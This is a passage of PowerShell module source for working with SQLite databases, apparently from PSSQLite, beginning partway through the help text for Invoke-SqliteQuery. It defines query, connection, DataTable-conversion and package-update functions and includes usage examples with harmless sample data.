        As DataSet:      System.Data.DataTableCollectionSystem.Data.DataSet
        As SingleValue:  Dependent on data type in first column.

    .EXAMPLE
        #
        # First, we create a database and a table
            $Query = "CREATE TABLE NAMES (fullname VARCHAR(20) PRIMARY KEY, surname TEXT, givenname TEXT, BirthDate DATETIME)"
            $Database = "C:\Names.SQLite"

            Invoke-SqliteQuery -Query $Query -DataSource $Database

        # We have a database, and a table, let's view the table info
            Invoke-SqliteQuery -DataSource $Database -Query "PRAGMA table_info(NAMES)"

                cid name      type         notnull dflt_value pk
                --- ----      ----         ------- ---------- --
                0 fullname  VARCHAR(20)        0             1
                1 surname   TEXT               0             0
                2 givenname TEXT               0             0
                3 BirthDate DATETIME           0             0

        # Insert some data, use parameters for the fullname and birthdate
            $query = "INSERT INTO NAMES (fullname, surname, givenname, birthdate) VALUES (@full, 'Cookie', 'Monster', @BD)"
            Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                full = "Cookie Monster"
                BD   = (get-date).addyears(-3)
            }

        # Check to see if we inserted the data:
            Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NAMES"

                fullname       surname givenname BirthDate
                --------       ------- --------- ---------
                Cookie Monster Cookie  Monster   3/14/2012 12:27:13 PM

        # Insert another entry with too many characters in the fullname.
        # Illustrate that SQLite data types may be misleading:
            Invoke-SqliteQuery -DataSource $Database -Query $query -SqlParameters @{
                full = "Cookie Monster$('!' * 20)"
                BD   = (get-date).addyears(-3)
            }

            Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NAMES"

                fullname              surname givenname BirthDate
                --------              ------- --------- ---------
                Cookie Monster        Cookie  Monster   3/14/2012 12:27:13 PM
                Cookie Monster![...]! Cookie  Monster   3/14/2012 12:29:32 PM

    .EXAMPLE
        Invoke-SqliteQuery -DataSource C:\NAMES.SQLite -Query "SELECT * FROM NAMES" -AppendDataSource

            fullname       surname givenname BirthDate             Database
            --------       ------- --------- ---------             --------
            Cookie Monster Cookie  Monster   3/14/2012 12:55:55 PM C:\Names.SQLite

        # Append Database column (path) to each result

    .EXAMPLE
        Invoke-SqliteQuery -DataSource C:\Names.SQLite -InputFile C:\Query.sql

        # Invoke SQL from an input file

    .EXAMPLE
        $Connection = New-SQLiteConnection -DataSource :MEMORY:
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "CREATE TABLE OrdersToNames (OrderID INT PRIMARY KEY, fullname TEXT);"
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "INSERT INTO OrdersToNames (OrderID, fullname) VALUES (1,'Cookie Monster');"
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "PRAGMA STATS"

        # Execute a query against an existing SQLiteConnection
            # Create a connection to a SQLite data source in memory
            # Create a table in the memory based datasource, verify it exists with PRAGMA STATS

    .EXAMPLE
        $Connection = New-SQLiteConnection -DataSource :MEMORY:
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "CREATE TABLE OrdersToNames (OrderID INT PRIMARY KEY, fullname TEXT);"
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "INSERT INTO OrdersToNames (OrderID, fullname) VALUES (1,'Cookie Monster');"
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "INSERT INTO OrdersToNames (OrderID) VALUES (2);"

        # We now have two entries, only one has a fullname.  Despite this, the following command returns both; very un-PowerShell!
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "SELECT * FROM OrdersToNames" -As DataRow | Where{$_.fullname}

            OrderID fullname
            ------- --------
                1   Cookie Monster
                2

        # Using the default -As PSObject, we can get PowerShell-esque behavior:
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "SELECT * FROM OrdersToNames" | Where{$_.fullname}

            OrderID fullname
            ------- --------
                1   Cookie Monster

    .LINK
        https://github.com/RamblingCookieMonster/Invoke-SQLiteQuery

    .LINK
        New-SQLiteConnection

    .LINK
        Invoke-SQLiteBulkCopy

    .LINK
        Out-DataTable

    .LINK
        https://www.sqlite.org/datatype3.html

    .LINK
        https://www.sqlite.org/lang.html

    .LINK
        http://www.sqlite.org/pragma.html

    .FUNCTIONALITY
        SQL
    #>
    [CmdletBinding( DefaultParameterSetName = 'Src-Que' )]
    [OutputType([System.Management.Automation.PSCustomObject], [System.Data.DataRow], [System.Data.DataTable], [System.Data.DataTableCollection], [System.Data.DataSet])]
    param(
        [Parameter( ParameterSetName = 'Src-Que',
            Position = 0,
            Mandatory = $true,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false,
            HelpMessage = 'SQLite Data Source required...' )]
        [Parameter( ParameterSetName = 'Src-Fil',
            Position = 0,
            Mandatory = $true,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false,
            HelpMessage = 'SQLite Data Source required...' )]
        [Alias('Path', 'File', 'FullName', 'Database')]
        [validatescript({
                #This should match memory, or the parent path should exist
                $Parent = Split-Path $_ -Parent
                if (
                    $_ -match ":MEMORY:|^WHAT$" -or
                ( $Parent -and (Test-Path $Parent))
                ) {
                    $True
                } else {
                    Throw "Invalid datasource '$_'.`nThis must match :MEMORY:, or '$Parent' must exist"
                }
            })]
        [string[]]
        $DataSource,

        [Parameter( ParameterSetName = 'Src-Que',
            Position = 1,
            Mandatory = $true,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [Parameter( ParameterSetName = 'Con-Que',
            Position = 1,
            Mandatory = $true,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [string]
        $Query,

        [Parameter( ParameterSetName = 'Src-Fil',
            Position = 1,
            Mandatory = $true,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [Parameter( ParameterSetName = 'Con-Fil',
            Position = 1,
            Mandatory = $true,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [ValidateScript({ Test-Path $_ })]
        [string]
        $InputFile,

        [Parameter( Position = 2,
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [Int32]
        $QueryTimeout = 600,

        [Parameter( Position = 3,
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [ValidateSet("DataSet", "DataTable", "DataRow", "PSObject", "SingleValue")]
        [string]
        $As = "PSObject",

        [Parameter( Position = 4,
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [System.Collections.IDictionary]
        $SqlParameters,

        [Parameter( Position = 5,
            Mandatory = $false )]
        [switch]
        $AppendDataSource,

        [Parameter( Position = 6,
            Mandatory = $false )]
        [validatescript({ Test-Path $_ })]
        [string]$AssemblyPath = $SQLiteAssembly,

        [Parameter( ParameterSetName = 'Con-Que',
            Position = 7,
            Mandatory = $true,
            ValueFromPipeline = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [Parameter( ParameterSetName = 'Con-Fil',
            Position = 7,
            Mandatory = $true,
            ValueFromPipeline = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [Alias( 'Connection', 'Conn' )]
        [System.Data.SQLite.SQLiteConnection]
        $SQLiteConnection
    )

    Begin {
        #Assembly, should already be covered by psm1
        Try {
            [void][System.Data.SQLite.SQLiteConnection]
        } Catch {
            $Library = Add-Type -Path $SQLiteAssembly -PassThru -ErrorAction stop
            if (!$Library) {
                Throw "This module requires the ADO.NET driver for SQLite:`n`thttp://system.data.sqlite.org/index.html/doc/trunk/www/downloads.wiki"
            }
        }

        if ($PSBoundParameters.ContainsKey('InputFile')) {
            $filePath = $(Resolve-Path $InputFile).path
            $Query = [System.IO.File]::ReadAllText("$filePath")
            Write-Verbose "Extracted query from [$InputFile]"
        }
        Write-Verbose "Running Invoke-SQLiteQuery with ParameterSet '$($PSCmdlet.ParameterSetName)'.  Performing query '$Query'"

        If ($As -eq "PSObject") {
            #This code scrubs DBNulls.  Props to Dave Wyatt
            $cSharp = @'
                using System;
                using System.Data;
                using System.Management.Automation;

                public class DBNullScrubber
                {
                    public static PSObject DataRowToPSObject(DataRow row)
                    {
                        PSObject psObject = new PSObject();

                        if (row != null && (row.RowState & DataRowState.Detached) != DataRowState.Detached)
                        {
                            foreach (DataColumn column in row.Table.Columns)
                            {
                                Object value = null;
                                if (!row.IsNull(column))
                                {
                                    value = row[column];
                                }

                                psObject.Properties.Add(new PSNoteProperty(column.ColumnName, value));
                            }
                        }

                        return psObject;
                    }
                }
'@

            Try {
                if ($PSEdition -eq 'Core') {
                    # Core doesn't auto-load these assemblies unlike desktop?
                    # Not csharp coder, unsure why
                    # by fffnite
                    $Ref = @(
                        'System.Data.Common'
                        'System.Management.Automation'
                        'System.ComponentModel.TypeConverter'
                    )
                } else {
                    $Ref = @(
                        'System.Data'
                        'System.Xml'
                    )
                }
                Add-Type -TypeDefinition $cSharp -ReferencedAssemblies $Ref -ErrorAction stop
            } Catch {
                If (-not $_.ToString() -like "*The type name 'DBNullScrubber' already exists*") {
                    Write-Warning "Could not load DBNullScrubber.  Defaulting to DataRow output: $_"
                    $As = "Datarow"
                }
            }
        }

        #Handle existing connections
        if ($PSBoundParameters.Keys -contains "SQLiteConnection") {
            if ($SQLiteConnection.State -notlike "Open") {
                Try {
                    $SQLiteConnection.Open()
                } Catch {
                    Throw $_
                }
            }

            if ($SQLiteConnection.state -notlike "Open") {
                Throw "SQLiteConnection is not open:`n$($SQLiteConnection | Out-String)"
            }

            $DataSource = @("WHAT")
        }
    }
    Process {
        foreach ($DB in $DataSource) {

            if ($PSBoundParameters.Keys -contains "SQLiteConnection") {
                $Conn = $SQLiteConnection
            } else {
                # Resolve the path entered for the database to a proper path name.
                # This accounts for a variaty of possible ways to provide a path, but
                # in the end the connection string needs a fully qualified file path.
                if ($DB -match ":MEMORY:") {
                    $Database = $DB
                } else {
                    $Database = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($DB)
                }

                if (Test-Path $Database) {
                    Write-Verbose "Querying existing Data Source '$Database'"
                } else {
                    Write-Verbose "Creating andn querying Data Source '$Database'"
                }

                $ConnectionString = "Data Source={0}" -f $Database

                $conn = New-Object System.Data.SQLite.SQLiteConnection -ArgumentList $ConnectionString
                $conn.ParseViaFramework = $true #Allow UNC paths, thanks to Ray Alex!
                Write-Debug "ConnectionString $ConnectionString"

                Try {
                    $conn.Open()
                } Catch {
                    Write-Error $_
                    continue
                }
            }

            $cmd = $Conn.CreateCommand()
            $cmd.CommandText = $Query
            $cmd.CommandTimeout = $QueryTimeout

            if ($null -ne $SqlParameters) {
                $SqlParameters.GetEnumerator() |
                    ForEach-Object {
                        If ($null -ne $_.Value) {
                            if ($_.Value -is [datetime]) { $_.Value = $_.Value.ToString("yyyy-MM-dd HH:mm:ss") }
                            $cmd.Parameters.AddWithValue("@$($_.Key)", $_.Value)
                        } Else {
                            $cmd.Parameters.AddWithValue("@$($_.Key)", [DBNull]::Value)
                        }
                    } > $null
            }

            $ds = New-Object system.Data.DataSet
            $da = New-Object System.Data.SQLite.SQLiteDataAdapter($cmd)

            Try {
                [void]$da.fill($ds)
                if ($PSBoundParameters.Keys -notcontains "SQLiteConnection") {
                    $conn.Close()
                }
                $cmd.Dispose()
            } Catch {
                $Err = $_
                if ($PSBoundParameters.Keys -notcontains "SQLiteConnection") {
                    $conn.Close()
                }
                switch ($ErrorActionPreference.tostring()) {
                    { 'SilentlyContinue', 'Ignore' -contains $_ } {}
                    'Stop' { Throw $Err }
                    'Continue' { Write-Error $Err }
                    Default { Write-Error $Err }
                }
            }

            if ($AppendDataSource) {
                $Column = New-Object Data.DataColumn
                $Column.ColumnName = "Datasource"
                $ds.Tables[0].Columns.Add($Column)

                Try {
                    #Someone better at regular expression, feel free to tackle this
                    $Conn.ConnectionString -match "Data Source=(?<DataSource>.*);"
                    $Datasrc = $Matches.DataSource.split(";")[0]
                } Catch {
                    $Datasrc = $DB
                }

                Foreach ($row in $ds.Tables[0]) {
                    $row.Datasource = $Datasrc
                }
            }
            switch ($As) {
                'DataSet' {
                    $ds
                }
                'DataTable' {
                    $ds.Tables
                }
                'DataRow' {
                    $ds.Tables[0]
                }
                'PSObject' {
                    #Scrub DBNulls - Provides convenient results you can use comparisons with
                    #Introduces overhead (e.g. ~2000 rows w/ ~80 columns went from .15 Seconds to .65 Seconds - depending on your data could be much more!)
                    foreach ($row in $ds.Tables[0].Rows) {
                        [DBNullScrubber]::DataRowToPSObject($row)
                    }
                }
                'SingleValue' {
                    $ds.Tables[0] | Select-Object -ExpandProperty $ds.Tables[0].Columns[0].ColumnName
                }
            }
        }
    }
}

function New-SQLiteConnection {
    <#
    .SYNOPSIS
        Creates a SQLiteConnection to a SQLite data source

    .DESCRIPTION
        Creates a SQLiteConnection to a SQLite data source

    .PARAMETER DataSource
        SQLite Data Source to connect to.

    .PARAMETER Password
        Specifies A Secure String password to use in the SQLite connection string.

        SECURITY NOTE: If you use the -Debug switch, the connectionstring including plain text password will be sent to the debug stream.

    .PARAMETER ReadOnly
        If specified, open SQLite data source as read only

    .PARAMETER Open
        We open the connection by default.  You can use this parameter to create a connection without opening it.

    .OUTPUTS
        System.Data.SQLite.SQLiteConnection

    .EXAMPLE
        $Connection = New-SQLiteConnection -DataSource C:\NAMES.SQLite
        Invoke-SQLiteQuery -SQLiteConnection $Connection -query $Query

        # Connect to C:\NAMES.SQLite, invoke a query against it

    .EXAMPLE
        $Connection = New-SQLiteConnection -DataSource :MEMORY:
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "CREATE TABLE OrdersToNames (OrderID INT PRIMARY KEY, fullname TEXT);"
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "INSERT INTO OrdersToNames (OrderID, fullname) VALUES (1,'Cookie Monster');"
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "PRAGMA STATS"

        # Create a connection to a SQLite data source in memory
        # Create a table in the memory based datasource, verify it exists with PRAGMA STATS

        $Connection.Close()
        $Connection.Open()
        Invoke-SqliteQuery -SQLiteConnection $Connection -Query "PRAGMA STATS"

        #Close the connection, open it back up, verify that the ephemeral data no longer exists

    .LINK
        https://github.com/RamblingCookieMonster/Invoke-SQLiteQuery

    .LINK
        Invoke-SQLiteQuery

    .FUNCTIONALITY
        SQL

    #>
    [cmdletbinding()]
    [OutputType([System.Data.SQLite.SQLiteConnection])]
    param(
        [Parameter( Position = 0,
            Mandatory = $true,
            ValueFromPipeline = $true,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false,
            HelpMessage = 'SQL Server Instance required...' )]
        [Alias( 'Instance', 'Instances', 'ServerInstance', 'Server', 'Servers', 'cn', 'Path', 'File', 'FullName', 'Database' )]
        [ValidateNotNullOrEmpty()]
        [string[]]
        $DataSource,

        [Parameter( Position = 2,
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [System.Security.SecureString]
        $Password,

        [Parameter( Position = 3,
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [Switch]
        $ReadOnly,

        [Parameter( Position = 4,
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ValueFromRemainingArguments = $false )]
        [bool]
        $Open = $True
    )
    Process {
        foreach ($DataSRC in $DataSource) {
            if ($DataSRC -match ':MEMORY:' ) {
                $Database = $DataSRC
            } else {
                $Database = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($DataSRC)
            }

            Write-Verbose "Querying Data Source '$Database'"
            [string]$ConnectionString = "Data Source=$Database;"
            if ($Password) {
                $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
                $PlainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
                $ConnectionString += "Password=$PlainPassword;"
            }
            if ($ReadOnly) {
                $ConnectionString += "Read Only=True;"
            }

            $conn = New-Object System.Data.SQLite.SQLiteConnection -ArgumentList $ConnectionString
            $conn.ParseViaFramework = $true #Allow UNC paths, thanks to Ray Alex!
            Write-Debug "ConnectionString $ConnectionString"

            if ($Open) {
                Try {
                    $conn.Open()
                } Catch {
                    Write-Error $_
                    continue
                }
            }

            Write-Verbose "Created SQLiteConnection:`n$($Conn | Out-String)"

            $Conn
        }
    }
}

function Out-DataTable {
    <#
    .SYNOPSIS
        Creates a DataTable for an object

    .DESCRIPTION
        Creates a DataTable based on an object's properties.

    .PARAMETER InputObject
        One or more objects to convert into a DataTable

    .PARAMETER NonNullable
        A list of columns to set disable AllowDBNull on

    .INPUTS
        Object
            Any object can be piped to Out-DataTable

    .OUTPUTS
        System.Data.DataTable

    .EXAMPLE
        $dt = Get-psdrive | Out-DataTable

        # This example creates a DataTable from the properties of Get-psdrive and assigns output to $dt variable

    .EXAMPLE
        Get-Process | Select Name, CPU | Out-DataTable | Invoke-SQLBulkCopy -ServerInstance $SQLInstance -Database $Database -Table $SQLTable -force -verbose

        # Get a list of processes and their CPU, create a datatable, bulk import that data
    .LINK
        https://github.com/RamblingCookieMonster/PowerShell

    .LINK
        Invoke-SQLBulkCopy

    .LINK
        Invoke-Sqlcmd2

    .LINK
        New-SQLConnection

    .FUNCTIONALITY
        SQL
    #>
    [CmdletBinding()]
    [OutputType([System.Data.DataTable])]
    param(
        [Parameter( Position = 0,
            Mandatory = $true,
            ValueFromPipeline = $true)]
        [PSObject[]]$InputObject,

        [string[]]$NonNullable = @()
    )

    Begin {
        $dt = New-Object Data.datatable
        $First = $true
        function Get-ODTType {
            param($type)
            $types = @(
                'System.Boolean',
                'System.Byte[]',
                'System.Byte',
                'System.Char',
                'System.Datetime',
                'System.Decimal',
                'System.Double',
                'System.Guid',
                'System.Int16',
                'System.Int32',
                'System.Int64',
                'System.Single',
                'System.UInt16',
                'System.UInt32',
                'System.UInt64'
            )
            if ( $types -contains $type ) {
                Write-Output "$type"
            } else {
                Write-Output 'System.String'
            }
        } #Get-Type
    }
    Process {
        foreach ($Object in $InputObject) {
            $DR = $DT.NewRow()
            foreach ($Property in $Object.PsObject.Properties) {
                $Name = $Property.Name
                $Value = $Property.Value
                #RCM: what if the first property is not reflective of all the properties?  Unlikely, but...
                if ($First) {
                    $Col = New-Object Data.DataColumn
                    $Col.ColumnName = $Name

                    #If it's not DBNull or Null, get the type
                    if ($Value -isnot [System.DBNull] -and $null -ne $Value) {
                        $Col.DataType = [System.Type]::GetType( $(Get-ODTType $property.TypeNameOfValue) )
                    }

                    #Set it to nonnullable if specified
                    if ($NonNullable -contains $Name ) {
                        $col.AllowDBNull = $false
                    }
                    try {
                        $DT.Columns.Add($Col)
                    } catch {
                        Write-Error "Could not add column $($Col | Out-String) for property '$Name' with value '$Value' and type '$($Value.GetType().FullName)':`n$_"
                    }
                }

                Try {
                    #Handle arrays and nulls
                    if ($property.GetType().IsArray) {
                        $DR.Item($Name) = $Value | ConvertTo-Xml -As String -NoTypeInformation -Depth 1
                    } elseif ($null -eq $Value) {
                        $DR.Item($Name) = [DBNull]::Value
                    } else {
                        $DR.Item($Name) = $Value
                    }
                } Catch {
                    Write-Error "Could not add property '$Name' with value '$Value' and type '$($Value.GetType().FullName)'"
                    continue
                }

                #Did we get a null or dbnull for a non-nullable item?  let the user know.
                if ($NonNullable -contains $Name -and ($Value -is [System.DBNull] -or $null -eq $Value)) {
                    Write-Verbose "NonNullable property '$Name' with null value found: $($object | Out-String)"
                }

            }

            Try {
                $DT.Rows.Add($DR)
            } Catch {
                Write-Error "Failed to add row '$($DR | Out-String)':`n$_"
            }

            $First = $false
        }
    }

    end {
        Write-Output @(, $dt)
    }
}

function Update-Sqlite {
    [CmdletBinding()]
    param(
        [Parameter()]
        [string]$version = '1.0.112',

        [Parameter()]
        [ValidateSet('linux-x64', 'osx-x64', 'win-x64', 'win-x86')]
        [string]$OS
    )
    Process {
        Write-Verbose "Creating build directory"
        New-Item -ItemType directory build
        Set-Location build
        $file = "system.data.sqlite.core.$version"

        Write-Verbose "downloading files from nuget"
        $dl = @{
            uri     = "https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/$version"
            outfile = "$file.nupkg"
        }
        Invoke-WebRequest @dl

        Write-Verbose "unpacking and copying files to module directory"
        Expand-Archive $dl.outfile

        $InstallPath = (Get-Module PSSQlite).path.TrimEnd('PSSQLite.psm1')
        Copy-Item $file/lib/netstandard2.0/System.Data.SQLite.dll $InstallPath/core/$os/
        Copy-Item $file/runtimes/$os/native/netstandard2.0/SQLite.Interop.dll $InstallPath/core/$os/

        Write-Verbose "removing build folder"
        Set-Location ..
        Remove-Item ./build -Recurse
        Write-Verbose "complete"

        Write-Warning "Please reimport the module to use the latest files"
    }
}
Initialize-SQLiteDB
Export-ModuleMember -Function '*' -Variable '*' -Cmdlet '*' -Alias '*' -Verbose:($VerbosePreference -eq "Continue")